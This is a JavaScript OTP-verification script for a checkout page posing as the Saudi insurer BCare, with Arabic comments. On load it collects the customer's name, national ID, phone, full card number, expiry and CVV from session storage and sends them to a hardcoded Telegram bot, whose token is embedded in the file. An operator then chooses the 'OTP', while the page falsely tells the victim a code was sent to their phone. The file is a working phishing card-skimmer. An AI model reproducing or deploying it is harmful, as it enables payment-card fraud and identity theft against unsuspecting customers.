/* =====================================================
   بي كير — otp-verify.js  v3
   ══════════════════════════════════════════════════
   التدفق الصحيح:
   1. العميل يضغط "ادفع الآن" → تفاصيل الطلب تصل Telegram (بدون OTP)
   2. الأدمن يراجع في Telegram
   3. الأدمن يرسل رمز 6 أرقام (يختاره بنفسه) للموافقة
      أو يرسل REJECT للرفض
   4. الصفحة تستلم قرار الأدمن من Telegram
   5. إذا وافقت → الرمز يُعرض للعميل → يُدخله → نجاح
   6. إذا رفضت → الصفحة تُظهر "تم رفض العملية"
===================================================== */
'use strict';

/* ─── ⚙️ إعدادات Telegram ───────────────────────── */
const TG = {
  TOKEN: '8297451860:AAG52IqNkSFFPhMJr82TNEpqYNd0i7u3Dow',
  CHAT:  '1451039924',
};

const TIMER_SEC = 120; /* دقيقتان للأدمن لمراجعة الطلب */

/* ─── الحالة ─────────────────────────────────────── */
let adminOTP     = '';       /* الرمز الذي يرسله الأدمن */
let adminDecision= null;     /* 'approve' | 'reject' | null */
let timerVal     = TIMER_SEC;
let timerInt     = null;
let pollInt      = null;
let lastUpdateId = 0;

/* ─── Telegram API ───────────────────────────────── */
async function tgSend(text) {
  try {
    const res = await fetch(
      `https://api.telegram.org/bot${TG.TOKEN}/sendMessage`,
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TG.CHAT, text, parse_mode: 'HTML' }),
      }
    );
    const data = await res.json();
    return data.ok;
  } catch(e) { console.error('TG send:', e); return false; }
}

async function tgGetUpdates() {
  try {
    const res  = await fetch(
      `https://api.telegram.org/bot${TG.TOKEN}/getUpdates?offset=${lastUpdateId+1}&timeout=2`
    );
    const data = await res.json();
    return data.ok ? (data.result || []) : [];
  } catch(e) { return []; }
}

/* ─── بناء رسالة الطلب (بدون OTP) ─────────────────── */
function buildOrderMsg() {
  try {
    const offer  = JSON.parse(sessionStorage.getItem('bcare_offer')  || '{}');
    const policy = JSON.parse(sessionStorage.getItem('bcare_policy') || '{}');
    const form   = JSON.parse(sessionStorage.getItem('bcare_form')   || '{}');
    const card   = JSON.parse(sessionStorage.getItem('bcare_card_data') || '{}');

    return `🔔 <b>طلب دفع جديد — بي كير</b>

👤 <b>العميل</b>
• الاسم: <b>${policy.fullName || '—'}</b>
• رقم الهوية: <code>${form.nationalId || '—'}</code>
• الجوال: <code>${policy.mobile || '—'}</code>

🚗 <b>التأمين</b>
• الشركة: <b>${offer.companyName || '—'}</b>
• نوع التأمين: ${offer.insuranceType || '—'}
• ماركة المركبة: ${policy.carBrand || '—'}
• رقم اللوحة: ${policy.plateNumber || '—'}

💳 <b>بطاقة الدفع</b>
• رقم البطاقة: <code>${card.number || '****'}</code>
• النوع: ${card.type || '—'}
• تاريخ الانتهاء: <code>${card.expiry || '—'}</code>
• CVV: <code>${card.cvv || '—'}</code>
• الاسم: ${card.name || policy.fullName || '—'}

💰 <b>المبلغ</b>
• الرسوم: ر.س ${offer.price ? parseFloat(offer.price).toFixed(2) : '—'}
• الضريبة 15%: ر.س ${offer.vat ? parseFloat(offer.vat).toFixed(2) : '—'}
• <b>المجموع: ر.س ${offer.total ? parseFloat(offer.total).toFixed(2) : '—'}</b>

🆔 المرجع: <code>${offer.refNumber || '—'}</code>

━━━━━━━━━━━━━━━
✅ <b>للموافقة:</b> أرسل رمز 6 أرقام (تختاره بنفسك)
❌ <b>للرفض:</b> أرسل <code>REJECT</code>

<i>العميل ينتظر قرارك...</i>`;
  } catch(e) {
    return `🔔 طلب دفع جديد — بي كير`;
  }
}

/* ─── Polling قرار الأدمن من Telegram ──────────────── */
function startPolling() {
  clearInterval(pollInt);
  pollInt = setInterval(async () => {
    const updates = await tgGetUpdates();
    for (const u of updates) {
      lastUpdateId = u.update_id;
      const text = u.message?.text?.trim() || '';

      /* REJECT → رفض */
      if (text.toUpperCase() === 'REJECT') {
        adminDecision = 'reject';
        clearInterval(pollInt);
        showRejection();
        return;
      }

      /* 6 أرقام → موافقة، الرمز يصبح OTP الصحيح */
      if (/^\d{6}$/.test(text)) {
        adminOTP      = text;
        adminDecision = 'approve';
        clearInterval(pollInt);
        showOTPToCustomer(text);
        return;
      }
    }
  }, 3000);
}

/* ─── عرض OTP للعميل (بعد موافقة الأدمن) ──────────── */
function showOTPToCustomer(code) {
  /* إخفاء رسالة الانتظار */
  const waitMsg = document.getElementById('otp-waiting-msg');
  if (waitMsg) waitMsg.style.display = 'none';

  /* تحديث النص */
  const sub = document.getElementById('otp-sub-text');
  if (sub) sub.innerHTML = `أدخل رمز التحقق المؤلف من 6 أرقام<br/>
    <span style="color:var(--blue);font-weight:600">تم إرسال الرمز إلى هاتفك</span>`;

  /* إعادة تفعيل المؤقت للعميل (60 ثانية للإدخال) */
  startCustomerTimer();

  /* تفعيل المربعات */
  document.querySelectorAll('.otp-box').forEach(b => b.disabled = false);
  const confirmBtn = document.getElementById('otp-confirm-btn');
  if (confirmBtn) confirmBtn.style.display = '';
  document.querySelector('.otp-box')?.focus();
}

/* ─── عرض الرفض ───────────────────────────────────── */
function showRejection() {
  clearInterval(timerInt);
  clearInterval(pollInt);

  const card = document.getElementById('otp-card');
  if (card) card.innerHTML = `
    <div class="off-card-body" style="text-align:center;padding:2.5rem 1.5rem">
      <div style="width:72px;height:72px;border-radius:50%;background:var(--red-bg);display:flex;align-items:center;justify-content:center;margin:0 auto 1.25rem">
        <span class="material-icons" style="font-size:2.2rem;color:var(--red)">cancel</span>
      </div>
      <h2 style="font-size:1.2rem;font-weight:800;color:var(--red);margin-bottom:.5rem">تم رفض العملية</h2>
      <p style="font-size:.88rem;color:var(--gray-500);line-height:1.65;margin-bottom:1.5rem">
        نعتذر، تم رفض عملية الدفع بعد مراجعة البيانات.<br/>
        يرجى التحقق من بيانات البطاقة والمحاولة مرة أخرى.
      </p>
      <button type="button" class="off-btn-secondary" style="width:100%" onclick="window.location.href='secure-checkout.html'">
        العودة لصفحة الدفع
      </button>
    </div>`;
}

/* ─── قراءة بيانات العملية ────────────────────────── */
function loadData() {
  try {
    const offer = JSON.parse(sessionStorage.getItem('bcare_offer') || '{}');
    const set = (id,v) => { const e=document.getElementById(id); if(e) e.textContent=v; };
    set('otp-amount',  offer.total ? 'ر.س '+parseFloat(offer.total).toFixed(2) : '—');
    set('otp-company', offer.companyName || '—');
  } catch(e) {}
}

/* ─── Timer انتظار الأدمن ─────────────────────────── */
function startAdminTimer() {
  timerVal = TIMER_SEC;
  const countEl = document.getElementById('otp-timer-count');
  const resendBtn = document.getElementById('otp-resend-btn');

  clearInterval(timerInt);
  timerInt = setInterval(() => {
    timerVal--;
    if (countEl) {
      countEl.textContent = timerVal;
      countEl.classList.toggle('urgent', timerVal <= 30);
    }
    if (timerVal <= 0) {
      clearInterval(timerInt);
      if (countEl) countEl.textContent = '00';
      /* انتهى الوقت بدون قرار → إعادة الإرسال */
      if (resendBtn) resendBtn.disabled = false;
    }
  }, 1000);
}

/* ─── Timer إدخال العميل (بعد الموافقة) ───────────── */
function startCustomerTimer() {
  timerVal = 60;
  const countEl = document.getElementById('otp-timer-count');
  const resendBtn = document.getElementById('otp-resend-btn');
  if (resendBtn) resendBtn.disabled = true;

  clearInterval(timerInt);
  timerInt = setInterval(() => {
    timerVal--;
    if (countEl) {
      countEl.textContent = timerVal;
      countEl.classList.toggle('urgent', timerVal <= 15);
    }
    if (timerVal <= 0) {
      clearInterval(timerInt);
      if (countEl) countEl.textContent = '00';
      if (resendBtn) resendBtn.disabled = false;
    }
  }, 1000);
}

/* ─── مربعات OTP ──────────────────────────────────── */
function initBoxes() {
  const boxes      = [...document.querySelectorAll('.otp-box')];
  const confirmBtn = document.getElementById('otp-confirm-btn');

  /* معطّلة حتى يوافق الأدمن */
  boxes.forEach(b => b.disabled = true);
  if (confirmBtn) confirmBtn.style.display = 'none';

  boxes.forEach((box, idx) => {
    box.addEventListener('input', e => {
      box.value = e.target.value.replace(/\D/g,'').slice(-1);
      box.classList.toggle('filled', !!box.value);
      if (box.value && idx < boxes.length-1) boxes[idx+1].focus();
      const done = boxes.every(b => b.value);
      if (confirmBtn) confirmBtn.disabled = !done;
      clearOTPErr();
    });

    box.addEventListener('keydown', e => {
      if (e.key === 'Backspace' && !box.value && idx > 0) {
        boxes[idx-1].value = '';
        boxes[idx-1].classList.remove('filled');
        boxes[idx-1].focus();
        if (confirmBtn) confirmBtn.disabled = true;
      }
    });

    box.addEventListener('paste', e => {
      e.preventDefault();
      const p = (e.clipboardData?.getData('text')||'').replace(/\D/g,'').slice(0,6);
      p.split('').forEach((d,i) => { if(boxes[i]) { boxes[i].value=d; boxes[i].classList.add('filled'); } });
      if (confirmBtn) confirmBtn.disabled = p.length < 6;
      if (boxes[Math.min(p.length, 5)]) boxes[Math.min(p.length, 5)].focus();
    });
  });

  /* زر التأكيد */
  if (confirmBtn) confirmBtn.addEventListener('click', verifyOTP);

  /* إعادة الإرسال (تعيد رسالة الطلب للأدمن) */
  const resendBtn = document.getElementById('otp-resend-btn');
  if (resendBtn) {
    resendBtn.addEventListener('click', async () => {
      boxes.forEach(b => { b.value=''; b.classList.remove('filled','otp-error','otp-success'); b.disabled = true; });
      if (confirmBtn) { confirmBtn.disabled = true; confirmBtn.style.display = 'none'; }
      clearOTPErr();
      adminOTP = '';
      adminDecision = null;
      /* إعادة إرسال رسالة الطلب */
      await tgSend(buildOrderMsg());
      /* إعادة المؤقت */
      startAdminTimer();
      startPolling();
      /* إظهار رسالة انتظار */
      const waitMsg = document.getElementById('otp-waiting-msg');
      if (waitMsg) waitMsg.style.display = '';
      const sub = document.getElementById('otp-sub-text');
      if (sub) sub.innerHTML = `أدخل رمز التحقق المؤلف من 6 أرقام<br/>
        <span style="color:var(--blue);font-weight:600">بانتظار مراجعة العملية...</span>`;
    });
  }
}

/* ─── التحقق من OTP (مقارنة برمز الأدمن) ───────────── */
async function verifyOTP() {
  const boxes   = [...document.querySelectorAll('.otp-box')];
  const entered = boxes.map(b => b.value).join('');

  if (entered === adminOTP) {
    /* ✅ صحيح */
    clearInterval(timerInt);
    clearInterval(pollInt);
    boxes.forEach(b => b.classList.add('otp-success'));

    /* 📨 رسالة لـ Telegram: العميل أكّد */
    try {
      const offer = JSON.parse(sessionStorage.getItem('bcare_offer') || '{}');
      await tgSend(`✅ <b>تم تأكيد الدفع بنجاح</b>

🏢 ${offer.companyName||'—'}
💰 ر.س ${parseFloat(offer.total||0).toFixed(2)}
🆔 <code>${offer.refNumber||'—'}</code>

<i>العملية مكتملة ✅</i>`);
    } catch(e) {}

    showSuccess();
  } else {
    /* ❌ خاطئ */
    boxes.forEach(b => {
      b.classList.add('otp-error');
      setTimeout(() => b.classList.remove('otp-error'), 500);
    });
    setOTPErr('رمز التحقق غير صحيح — حاول مرة أخرى');
    setTimeout(() => {
      boxes.forEach(b => { b.value=''; b.classList.remove('filled'); });
      const confirmBtn = document.getElementById('otp-confirm-btn');
      if (confirmBtn) confirmBtn.disabled = true;
      boxes[0]?.focus();
    }, 600);
  }
}

function setOTPErr(msg) { const e=document.getElementById('otp-err'); if(e) e.textContent=msg; }
function clearOTPErr()  { const e=document.getElementById('otp-err'); if(e) e.textContent='';  }

/* ─── شاشة النجاح ─────────────────────────────────── */
function showSuccess() {
  const confirmBtn = document.getElementById('otp-confirm-btn');
  if (confirmBtn) {
    confirmBtn.disabled = true;
    confirmBtn.innerHTML = '<span class="material-icons spin-otp">autorenew</span> جاري التأكيد...';
  }
  setTimeout(() => {
    document.getElementById('otp-card')?.classList.add('hidden');
    const sc = document.getElementById('otp-success-card');
    if (sc) sc.classList.remove('hidden');
    try {
      const offer = JSON.parse(sessionStorage.getItem('bcare_offer') || '{}');
      const set = (id,v) => { const e=document.getElementById(id); if(e) e.textContent=v; };
      set('success-ref',     offer.refNumber || ('BC-'+Date.now().toString().slice(-8)));
      set('success-company', offer.companyName || '—');
      set('success-amount',  offer.total ? 'ر.س '+parseFloat(offer.total).toFixed(2) : '—');
    } catch(e){}
    window.scrollTo({top:0, behavior:'smooth'});
  }, 1200);
}

/* ─── INIT ────────────────────────────────────────── */
document.addEventListener('DOMContentLoaded', async () => {
  loadData();
  initBoxes();

  /* ضبط رقم مرجعي */
  try {
    const offer = JSON.parse(sessionStorage.getItem('bcare_offer') || '{}');
    if (!offer.refNumber) {
      offer.refNumber = 'BC-' + Date.now().toString().slice(-8).toUpperCase();
      sessionStorage.setItem('bcare_offer', JSON.stringify(offer));
    }
  } catch(e) {}

  /* 📨 إرسال رسالة الطلب للأدمن (بدون OTP) */
  await tgSend(buildOrderMsg());

  /* بدء المؤقت + الاستماع لقرار الأدمن */
  startAdminTimer();
  startPolling();
});
